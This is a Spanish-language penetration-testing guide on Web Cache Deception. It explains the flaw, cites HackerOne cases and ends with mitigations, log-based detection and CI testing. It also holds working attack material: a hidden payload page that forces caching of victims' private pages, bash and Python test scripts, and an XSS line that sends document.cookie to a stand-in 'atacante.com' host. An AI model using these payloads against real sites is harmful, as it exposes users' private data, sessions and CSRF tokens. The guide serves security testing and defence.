# Web Cache Deception (WCD)

## Definición

**Web Cache Deception** es una vulnerabilidad que permite a un atacante acceder a información sensible de usuarios autenticados explotando configuraciones incorrectas en los sistemas de caché web (CDNs, proxies, reverse proxies). El atacante manipula URLs para engañar al sistema de caché y hacer que almacene contenido privado como si fuera público y estático.

## Concepto Técnico

La vulnerabilidad surge por **discrepancias en el parsing de URLs** entre el servidor web y el sistema de caché:

- El **servidor web** procesa la URL completa y sirve contenido dinámico basado en la sesión del usuario
- El **sistema de caché** interpreta erróneamente la URL como un recurso estático (por la extensión) y almacena la respuesta
- Esto resulta en contenido privado siendo cacheado públicamente

## Proceso de Explotación

### 1. Identificación del Target
```bash
# Buscar endpoints que retornen información sensible
https://victima.com/perfil
https://victima.com/configuracion  
https://victima.com/dashboard
https://victima.com/api/user/data
```

### 2. Manipulación de URL
```bash
# URLs originales → URLs manipuladas
https://victima.com/perfil → https://victima.com/perfil/fake.css
https://victima.com/configuracion → https://victima.com/configuracion/style.js
https://victima.com/dashboard → https://victima.com/dashboard/image.png
https://victima.com/api/user/data → https://victima.com/api/user/data/script.js
```

### 3. Técnicas de Manipulación Avanzadas

#### Extensiones Comunes para Probar
```bash
.css    # Hojas de estilo
.js     # JavaScript  
.png    # Imágenes PNG
.jpg    # Imágenes JPEG
.gif    # Imágenes GIF
.svg    # Imágenes SVG
.txt    # Archivos de texto
.json   # Datos JSON
.xml    # Datos XML
.woff   # Fuentes web
.ico    # Iconos
.pdf    # Documentos PDF
```

#### Cache Keys y Parámetros
```bash
# Agregar parámetros para crear cache keys únicos
/perfil/fake.css?version=1.0
/perfil/fake.css?cache=123
/perfil/fake.css?v=2024
/perfil/fake.css?timestamp=1693817234
```

#### Delimitadores Especiales
```bash
# Usar delimitadores para confundir parsers
/perfil@fake.css
/perfil:fake.css  
/perfil;fake.css
/perfil#fake.css
/perfil%2ffake.css    # URL encoded slash
/perfil%3bfake.css    # URL encoded semicolon
```

### 4. Ejecución del Ataque

**Paso 1:** El atacante crea el payload
```html
<!-- Archivo malicioso en atacante.com -->
<img src="https://victima.com/perfil/malicious.css" style="display:none">
<script>
// Automatizar múltiples requests para forzar caché
for(let i=0; i<50; i++) {
    fetch('https://victima.com/perfil/payload' + i + '.css');
}
</script>
```

**Paso 2:** Víctima autenticada visita el enlace malicioso

**Paso 3:** El atacante verifica el contenido cacheado
```bash
# Acceso desde navegador anónimo/incógnito
curl -H "User-Agent: Mozilla/5.0" https://victima.com/perfil/malicious.css
```

## Metodología de Testing Manual

### 1. Descubrimiento de Endpoints Sensibles
```bash
# Con ffuf - buscar endpoints privados
ffuf -w /usr/share/seclists/Discovery/Web-Content/api_endpoints.txt \
     -u https://victima.com/FUZZ \
     -H "Cookie: session=VALID_SESSION" \
     -mc 200 -fs 0

# Con Burp Suite - mapear aplicación autenticada  
# 1. Spider completo con sesión válida
# 2. Identificar respuestas con datos sensibles
# 3. Filtrar por Content-Length > 1000 (contenido sustancial)
```

### 2. Testing de Cache Deception
```bash
# Script de automatización básica
#!/bin/bash
TARGET_URL="https://victima.com/perfil"
EXTENSIONS=("css" "js" "png" "jpg" "gif" "txt" "json" "xml")

echo "[+] Testing Web Cache Deception on: $TARGET_URL"

for ext in "${EXTENSIONS[@]}"; do
    echo "[*] Testing extension: .$ext"
    
    # Hacer request con sesión autenticada
    curl -s -H "Cookie: session=VALID_SESSION" \
         "$TARGET_URL/fake.$ext" \
         -w "Status: %{http_code} | Size: %{size_download}\n"
    
    # Verificar sin autenticación
    curl -s "$TARGET_URL/fake.$ext" \
         -w "Anonymous Status: %{http_code} | Size: %{size_download}\n"
    
    echo "---"
done
```

### 3. Análisis de Headers de Caché
```bash
# Verificar headers que indican caching activo
curl -I "https://victima.com/perfil/fake.css" | grep -E "(Cache-Control|Age|X-Cache|CF-Cache|Expires)"

# Headers críticos a buscar:
# Cache-Control: public, max-age=3600
# Age: 234
# X-Cache: HIT
# CF-Cache-Status: HIT
```

## Casos de Uso Reales y Ejemplos

### Ejemplo 1: Lyst.com (HackerOne #631589)
```bash
# URL vulnerable
https://www.lyst.com/shop/trends/mens-dress-shoes/malicious.css

# Datos expuestos:
# - username, email, user_id, user_slug
# - Información de sesión específica
# - Tokens internos de la aplicación
```

### Ejemplo 2: Shopify (HackerOne #1085472)  
```bash
# URL vulnerable en página 404 personalizada
https://help.shopify.com/es/manual/your-account/copyright-and-trademark/fake.css

# Datos expuestos en página 404:
# - Nombre del usuario autenticado
# - Email y foto de perfil  
# - Token CSRF válido
# - Headers: cf-cache-status: HIT
```

### Ejemplo 3: Vectores de Ataque Combinados

#### XSS + Web Cache Deception
```bash
# 1. Inyectar XSS en campo de perfil
POST /perfil/actualizar
name=<script>document.location='https://atacante.com/steal.php?cookie='+document.cookie</script>

# 2. Cachear la respuesta con XSS
GET /perfil/malicious.js

# 3. Víctimas subsecuentes ejecutan el XSS automáticamente
```

#### CSRF + Web Cache Deception
```bash
# 1. Obtener token CSRF válido vía cache deception  
GET /configuracion/fake.css
# Respuesta contiene: <input name="csrf_token" value="abc123xyz">

# 2. Usar token en ataque CSRF
POST /configuracion/cambiar-password
csrf_token=abc123xyz&new_password=pwned123
```

## Automatización con Burp Suite

### 1. Extensión Web Cache Deception Scanner
```bash
# Instalación desde BApp Store
# Configuración recomendada:
# - Extensions: css,js,png,jpg,gif,svg,txt,json,xml,woff,ico
# - Delimiters: /,@,:,;,#
# - Parameters: ?v=1,?cache=1,?version=1
```

### 2. Intruder Configuration  
```bash
# Posición de payload
GET /perfil/fake.§EXTENSION§ HTTP/1.1
Host: victima.com
Cookie: session=VALID_SESSION

# Payload list
css
js  
png
jpg
gif
svg
txt
json
xml
woff
ico
pdf
```

### 3. Param Miner para Cache Busting
```bash
# Configuración en Param Miner:
# - Max params to identify: 1000  
# - Cache buster: cachebuster
# - Identify cache poisoning: Enabled
# - Skip boring words: Disabled para WCD
```

## Herramientas Especializadas

### 1. CacheSniper
```bash
git clone https://github.com/Rhynorater/CacheSniper.git
cd CacheSniper

# Uso básico  
python3 cachesniper.py -u https://victima.com -e /perfil
```

### 2. Web-Cache-Vulnerability-Scanner
```bash
git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner.git

# Escaneo automático
python3 wcvs.py -u https://victima.com
```

### 3. Script Personalizado con Python
```python
#!/usr/bin/env python3
import requests
import time

class WebCacheDeceptionTester:
    def __init__(self, target_url, session_cookie):
        self.target_url = target_url
        self.session_cookie = session_cookie
        self.extensions = ['css', 'js', 'png', 'jpg', 'gif', 'svg', 'txt', 'json', 'xml']
        
    def test_cache_deception(self):
        print(f"[+] Testing Web Cache Deception on: {self.target_url}")
        
        for ext in self.extensions:
            fake_url = f"{self.target_url}/fake.{ext}"
            
            # Request with authentication
            auth_response = requests.get(
                fake_url, 
                cookies={'session': self.session_cookie}
            )
            
            # Wait for cache propagation
            time.sleep(2)
            
            # Request without authentication
            anon_response = requests.get(fake_url)
            
            # Check for potential cache deception
            if (auth_response.status_code == 200 and 
                anon_response.status_code == 200 and
                len(anon_response.text) > 100 and
                'cache' in str(anon_response.headers).lower()):
                
                print(f"[!] POTENTIAL WCD FOUND: {fake_url}")
                print(f"    Auth Length: {len(auth_response.text)}")  
                print(f"    Anon Length: {len(anon_response.text)}")
                print(f"    Cache Headers: {anon_response.headers.get('Cache-Control', 'None')}")

# Uso
tester = WebCacheDeceptionTester("https://victima.com/perfil", "your_session_cookie")
tester.test_cache_deception()
```

## Impacto y Escalación

### Información Típicamente Expuesta
- **Datos personales:** Nombre, email, teléfono, dirección
- **Información financiera:** Números de tarjeta parciales, historial de compras
- **Tokens de seguridad:** CSRF tokens, API keys, session tokens
- **Configuraciones privadas:** Preferencias de cuenta, configuración de API
- **Historial de actividad:** Búsquedas, navegación, interacciones

### Escalación de Privilegios
```bash
# 1. Cache deception en endpoint administrativo
https://victima.com/admin/users/fake.css
# → Acceso a listado de usuarios

# 2. Cache deception en API interna
https://victima.com/api/internal/config/fake.json  
# → Configuración de servicios internos

# 3. Cache deception en endpoint de debugging
https://victima.com/debug/info/fake.txt
# → Variables de entorno, credenciales
```

## Mitigaciones y Contramedidas

### 1. Configuración Correcta de Headers
```bash
# Apache .htaccess
<FilesMatch "\.(php|html|htm)$">
    Header always set Cache-Control "private, no-store, no-cache, must-revalidate"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
</FilesMatch>

# Nginx
location ~* \.(php|html|htm)$ {
    add_header Cache-Control "private, no-store, no-cache, must-revalidate";
    add_header Pragma "no-cache";  
    add_header Expires "0";
}
```

### 2. Validación Estricta de URLs
```php
// PHP - Validar estructura de URL
function validateUrlStructure($requestUri) {
    $allowedPaths = ['/perfil', '/configuracion', '/dashboard'];
    $basePath = parse_url($requestUri, PHP_URL_PATH);
    
    // Remover trailing paths no válidos
    foreach($allowedPaths as $allowed) {
        if(strpos($basePath, $allowed) === 0) {
            $remaining = substr($basePath, strlen($allowed));
            if(!empty($remaining) && $remaining !== '/') {
                http_response_code(404);
                exit('Not Found');
            }
        }
    }
}
```

### 3. Configuración CDN/Proxy
```bash
# Cloudflare - Cache Rules
# Solo cachear archivos específicamente permitidos:
# Cache everything matching: *.css, *.js, *.png, *.jpg (desde /static/ únicamente)

# Varnish VCL
sub vcl_recv {
    # Solo cachear archivos estáticos en directorio específico
    if (req.url ~ "^/static/.*\.(css|js|png|jpg|gif|svg|woff|ico)$") {
        return (hash);
    }
    return (pass);
}
```

### 4. Cache Deception Armor
```bash
# Cloudflare Cache Deception Armor
# Activar en: Security → Settings → Cache Deception Armor: ON

# Amazon CloudFront - Comportamiento personalizado
# Path pattern: /api/* 
# Cache Policy: CachingDisabled
# Origin Request Policy: CORS-S3Origin
```

## Detección y Monitoreo

### 1. Logs de Aplicación
```bash
# Detectar patrones sospechosos en logs
grep -E "\.(css|js|png|jpg)" access.log | grep -v "^/static/"

# Alertas para URLs anómalas  
tail -f access.log | grep -E "/(perfil|admin|api)/.*\.(css|js|png)"
```

### 2. Monitoreo de Headers
```python
# Script para monitorear cache headers anómalos
import requests
import re

def monitor_cache_headers(url):
    response = requests.get(url)
    
    # Detectar cache headers en contenido dinámico
    if ('Cache-Control' in response.headers and
        'public' in response.headers.get('Cache-Control', '') and
        re.search(r'\.(php|asp|jsp)', url)):
        
        print(f"[!] ALERT: Public cache on dynamic content: {url}")
        print(f"    Cache-Control: {response.headers.get('Cache-Control')}")
```

### 3. Testing Automatizado en CI/CD
```yaml
# GitHub Actions - Security Testing
name: Web Cache Deception Test
on: [push, pull_request]

jobs:
  cache-deception-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Test Cache Deception
        run: |
          python3 scripts/test_cache_deception.py \
            --target ${{ secrets.STAGING_URL }} \
            --auth-token ${{ secrets.TEST_TOKEN }}
```
